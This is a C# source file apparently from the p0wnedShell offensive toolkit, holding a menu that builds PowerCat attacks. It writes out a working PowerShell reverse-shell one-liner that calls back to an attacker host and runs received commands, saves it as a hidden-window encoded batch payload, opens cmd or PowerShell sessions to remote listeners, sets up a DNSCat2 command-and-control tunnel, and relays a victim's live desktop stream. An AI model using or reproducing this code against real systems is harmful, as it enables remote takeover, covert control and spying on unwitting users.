using System;
using System.IO;
using System.Net;
using System.Net.Sockets;

namespace p0wnedShell
{
	class PowerCat
	{
		private static P0wnedListenerConsole P0wnedListener = new P0wnedListenerConsole();
		
		public static void PowerBanner()	
		{
			string[] toPrint = { "* PowerCat our PowerShell TCP/IP Swiss Army Knife.                  *" };
//			Program.PrintBanner(toPrint);
		}
	
		public static void PowerMenu()
        {
			PowerBanner();
			Console.WriteLine(" 1. Setup an Reversed PowerCat Listener.");
			Console.WriteLine();
			Console.WriteLine(" 2. Connect to a remote PowerCat Listener.");
			Console.WriteLine();
			Console.WriteLine(" 3. Create a DNS tunnel to a remote DNSCat2 Server.");
			Console.WriteLine();
            Console.WriteLine(" 4. Create an Reversed Listener/Server for Nikhil Mittal's Show-TargetScreen function.");
            Console.WriteLine();
            Console.WriteLine(" 5. Back.");
			Console.Write("\nEnter choice: ");
			
			int userInput=0;			
			while (true)
			{
				try 
				{
					userInput = Convert.ToInt32(Console.ReadLine());
					if (userInput < 1 || userInput > 5) 
					{
						Console.ForegroundColor = ConsoleColor.Red;
						Console.WriteLine("\n[+] Wrong choice, please try again!\n");
						Console.ResetColor();
						Console.Write("Enter choice: ");
					}
					else
					{
						break;
					}
				}
				catch
				{
					Console.ForegroundColor = ConsoleColor.Red;
					Console.WriteLine("\n[+] Wrong choice, please try again!\n");
					Console.ResetColor();
					Console.Write("Enter choice: ");
				}
			}
			
			switch (userInput)
			{
				case 1:
					PowerReversed();
				break;
				case 2:
					PowerClient();
				break;
				case 3:
					PowerTunnel();
				break;
                case 4:
                    ShowScreen();
                break;
                default:
				break;
			}	
		}
		
		public static void PowerReversed()
        {
			PowerBanner();			
			Console.ForegroundColor = ConsoleColor.Yellow;
			Console.WriteLine("Setup an reversed listener so remote clients can connect-back to you.\n"); 
			Console.ResetColor();
			
			int Lport = 0;
			IPAddress Lhost = IPAddress.Parse("1.1.1.1");
			
			IPAddress LocalIPAddress = null;
			foreach (IPAddress address in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
			{
				if (address.AddressFamily == AddressFamily.InterNetwork)
				{
					LocalIPAddress = address;
					break;
				}
			}
			 
			if (LocalIPAddress != null)
			{
				Console.Write("\n[+] Our local IP address is: {0}, do you want to use this?  (y/n) > ", LocalIPAddress);
				Lhost = LocalIPAddress;
				
			}
			
			string input = Console.ReadLine();
			switch(input.ToLower())
			{
				case "y":
					break;
				case "n":
					while (true)
					{
						try
						{
							Console.Write("\nEnter ip address of your PowerCat Listener (e.g. 127.0.0.1): ");
							Console.ForegroundColor = ConsoleColor.Green;
							Lhost = IPAddress.Parse(Console.ReadLine());
							Console.ResetColor();
							Console.WriteLine();
							break;
						}
						catch
						{
							Console.ForegroundColor = ConsoleColor.Red;
							Console.WriteLine("\n[+] That's not a valid IP address, Please Try again");
							Console.ResetColor();
						}
					}
					break;
				default:
					Console.ForegroundColor = ConsoleColor.Red;
					Console.WriteLine("\n[+] Wrong choice, please try again!\n");
					Console.ResetColor();
					Console.WriteLine("Press Enter to Continue...");
					Console.ReadLine();
					return;
			}
			
			while (true)
            {
				try
				{
					Console.Write("Now Enter the listening port of your PowerCat Listener (e.g. 1337 or 4444): ");
					Console.ForegroundColor = ConsoleColor.Green;
					Lport = int.Parse(Console.ReadLine());
					Console.ResetColor();
					Console.WriteLine();
					
					if (Lport < 1 || Lport > 65535)
					{
						Console.ForegroundColor = ConsoleColor.Red;
						Console.WriteLine("[+] That's not a valid Port, Please Try again\n");
						Console.ResetColor();
					}
					else
					{
						break;
					}
				}
				catch
				{
					Console.ForegroundColor = ConsoleColor.Red;
					Console.WriteLine("\n[+] That's not a valid Port, Please Try again\n");
					Console.ResetColor();
				}
			}
			
			string Payload = "$client = New-Object System.Net.Sockets.TCPClient(\""+Lhost+"\","+Lport+");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";

			Console.WriteLine("[+] Generating a PowerShell Payload which you can run on your remote clients, so they connect-back to you ;)\n");
			Console.ForegroundColor = ConsoleColor.Green;
			File.WriteAllText(Program.P0wnedPath()+"\\Invoke-PowerShellTcpOneLine.ps1", Payload);
			Console.WriteLine("Payload saved as\t\t .\\Invoke-PowerShellTcpOneLine.ps1");
			//System.Diagnostics.Process.Start("notepad.exe", Program.P0wnedPath()+"\\Invoke-PowerShellTcpOneLine.ps1");
			Console.ResetColor();
			
			string Encode = "Invoke-Encode -DataToEncode "+Program.P0wnedPath()+"\\Invoke-PowerShellTcpOneLine.ps1 -OutCommand -OutputFilePath "+Program.P0wnedPath()+"\\Encoded.txt -OutputCommandFilePath "+Program.P0wnedPath()+"\\EncodedPayload.bat";
			Pshell.RunPSCommand(Encode);
			
			string EncodedCmd = String.Empty;
			if (File.Exists(Program.P0wnedPath()+"\\EncodedPayload.bat"))
			{
				File.Delete(Program.P0wnedPath()+"\\Encoded.txt");
				EncodedCmd = File.ReadAllText(Program.P0wnedPath()+"\\EncodedPayload.bat");
				File.WriteAllText(Program.P0wnedPath()+"\\EncodedPayload.bat", "powershell.exe -windowstyle hidden -e " + EncodedCmd);
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine("Encoded Payload saved as\t .\\EncodedPayload.bat");
				Console.ResetColor();
			}
			else
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.WriteLine("[+] Oops something went wrong, please try again!\n");
				Console.ResetColor();
				Console.WriteLine("Press Enter to Continue...");
				Console.ReadLine();	
				return;
			}
			
			Console.WriteLine("\n[+] Please wait while setting up our Listener...\n");
			
			string Reversed = "powercat -l -p "+Lport+" -t 1000 -Verbose";
			try
			{
				P0wnedListener.Execute(Reversed);
			}
			catch (Exception e)
			{
				Console.WriteLine(e.Message);
			}
			return;
			
		}
		
		public static void PowerClient()
        {
			PowerBanner();
			Console.ForegroundColor = ConsoleColor.Yellow;
			Console.WriteLine("Let's connect to a remote listener..\n"); 
			Console.ResetColor();
			
			int Rport = 0;
			IPAddress Rhost = IPAddress.Parse("1.1.1.1");
			
			while (true)
			{
				try
				{
					Console.Write("\nEnter ip address of your remote PowerCat Listener (e.g. 192.168.1.1): ");
					Console.ForegroundColor = ConsoleColor.Green;
					Rhost = IPAddress.Parse(Console.ReadLine());
					Console.ResetColor();
					Console.WriteLine();
					break;
				}
				catch
				{
					Console.ForegroundColor = ConsoleColor.Red;
					Console.WriteLine("\n[+] That's not a valid IP address, Please Try again");
					Console.ResetColor();
				}
			}
			
			while (true)
            {
				try
				{
					Console.Write("Now Enter the listening port of your PowerCat Listener (e.g. 1337 or 4444): ");
					Console.ForegroundColor = ConsoleColor.Green;
					Rport = int.Parse(Console.ReadLine());
					Console.ResetColor();
					Console.WriteLine();
					
					if (Rport < 1 || Rport > 65535)
					{
						Console.ForegroundColor = ConsoleColor.Red;
						Console.WriteLine("[+] That's not a valid Port, Please Try again\n");
						Console.ResetColor();
					}
					else
					{
						break;
					}
				}
				catch
				{
					Console.ForegroundColor = ConsoleColor.Red;
					Console.WriteLine("\n[+] That's not a valid Port, Please Try again\n");
					Console.ResetColor();
				}
			}
			
			string Session = "";
			Console.WriteLine("[+] Do you want to setup a remote PowerShell tunnel to your Listener?");
			Console.Write("[+] Otherwise a cmd session will be opened (y/n) > ");
			string input = Console.ReadLine();
			switch(input.ToLower())
			{
				case "y":
					Session = "-ep"; 
					break;
				case "n":
					Session = "-e cmd"; 
					break;
				default:
					Console.ForegroundColor = ConsoleColor.Red;
					Console.WriteLine("\n[+] Wrong choice, please try again!\n");
					Console.ResetColor();
					Console.WriteLine("Press Enter to Continue...");
					Console.ReadLine();
					return;
			}
			
			Console.WriteLine("\n[+] Please wait while connecting to our Listener...\n");
			
			string PowerClient = "powercat -c "+Rhost+" -p "+Rport+" "+Session+" -Verbose";
			try
			{
				P0wnedListener.Execute(PowerClient);
			}
			catch (Exception e)
			{
				Console.WriteLine(e.Message);
			}
			return;
		
		}
		
		public static void PowerTunnel()
        {
			PowerBanner();			
			Console.ForegroundColor = ConsoleColor.Yellow;
			Console.WriteLine("This tool is designed to create an encrypted command-and-control (C&C) channel over the DNS protocol,"); 
			Console.WriteLine("which is an effective tunnel out of almost every network.");
			Console.WriteLine("The server is designed to be run on an authoritative DNS server, so first make sure you have set this up.\n");
			Console.ResetColor();

			string Domain = "";
			while(true)
			{				
				Console.Write("[+] Please enter the domain name of our DNSCat2 server (e.g. CheeseHead.com) > ");
				Console.ForegroundColor = ConsoleColor.Green;
				Domain = Console.ReadLine().TrimEnd('\r', '\n');
				Console.ResetColor();
				if (Domain == "")
				{
					Console.ForegroundColor = ConsoleColor.Red;
					Console.WriteLine("\n[+] This is not a valid domain name, please try again\n");
					Console.ResetColor();
				}
				else
				{
					break;
				}
			}
			
			string Session = "";
			Console.Write("\n[+] Do you want to setup a remote PowerShell tunnel (otherwise a cmd session will be opened)? (y/n) > ");
			string input = Console.ReadLine();
			switch(input.ToLower())
			{
				case "y":
					Session = "-ep"; 
					break;
				case "n":
					Session = "-e cmd"; 
					break;
				default:
					Console.ForegroundColor = ConsoleColor.Red;
					Console.WriteLine("\n[+] Wrong choice, please try again!\n");
					Console.ResetColor();
					Console.WriteLine("Press Enter to Continue...");
					Console.ReadLine();
					return;
			}
			
			Console.WriteLine();
			Console.WriteLine("[+] Now make sure you run the following command on your DNSCat2 server:\n\n");
			Console.ForegroundColor = ConsoleColor.Blue;
			Console.WriteLine("To install the server (if not already installed):");
			Console.ForegroundColor = ConsoleColor.Green;			
			Console.WriteLine("$ git clone https://github.com/iagox86/dnscat2.git");
			Console.WriteLine("$ cd dnscat2/server/");
			Console.WriteLine("$ gem install bundler");
			Console.WriteLine("$ bundle install\n");
			Console.ForegroundColor = ConsoleColor.Blue;
			Console.WriteLine("\nAnd to run the server:");
			Console.ForegroundColor = ConsoleColor.Green;
			Console.WriteLine("$ sudo ruby ./dnscat2.rb "+Domain+"\n\n");
			Console.ResetColor();
			Console.WriteLine("[+] Ready to Rumble? then Press Enter to continue and wait for Shell awesomeness :)\n");
			Console.WriteLine("Press Enter to Continue...");
			Console.ReadLine();
			
			Console.WriteLine("[+] Please wait while setting up our DNS Tunnel...\n");
			
			string DNSCat = "powercat -dns "+Domain+" "+Session+" -Verbose";
			try
			{
				P0wnedListener.Execute(DNSCat);
			}
			catch (Exception e)
			{
				Console.WriteLine(e.Message);
			}
			return;
		}

        public static void ShowScreen()
        {
            PowerBanner();
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("Creates an Reversed Listener/Server for Nikhil Mittal's Show-TargetScreen function,");
            Console.WriteLine("which can be used with Client Side Attacks. This code can stream a target's desktop in real time");
            Console.WriteLine("and could be seen in browsers which support MJPEG (Firefox).\n");
            Console.ResetColor();

            int Lport = 0;
            int Rport = 0;

            while (true)
            {
                try
                {
                    Console.Write("Please Enter the listening port of your PowerCat Listener (e.g. 443): ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    Lport = int.Parse(Console.ReadLine());
                    Console.ResetColor();
                    Console.WriteLine();

                    if (Lport < 1 || Lport > 65535)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[+] That's not a valid Port, Please Try again\n");
                        Console.ResetColor();
                    }
                    else
                    {
                        break;
                    }
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] That's not a valid Port, Please Try again\n");
                    Console.ResetColor();
                }
            }

            while (true)
            {
                try
                {
                    Console.Write("Now Enter a local relay port to which Show-TargetScreen connects (e.g. 9000): ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    Rport = int.Parse(Console.ReadLine());
                    Console.ResetColor();
                    Console.WriteLine();

                    if (Lport < 1 || Lport > 65535)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[+] That's not a valid Port, Please Try again\n");
                        Console.ResetColor();
                    }
                    else
                    {
                        break;
                    }
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] That's not a valid Port, Please Try again\n");
                    Console.ResetColor();
                }
            }

            Console.WriteLine("[+] Please wait while setting up our Show-TargetScreen Listener/Relay...\n");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("Now if we point Firefox to http://127.0.0.1:"+Rport+ " and run Show-TargetScreen on a victim,");
            Console.WriteLine("we should have a live stream of the target user's Desktop.\n");
            Console.ResetColor();

            string ShowTargetScreen = "powercat -l -v -p " + Lport + " -r tcp:"+Rport+" -rep -t 1000";
            try
            {
                P0wnedListener.Execute(ShowTargetScreen);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            return;
        }
    }
}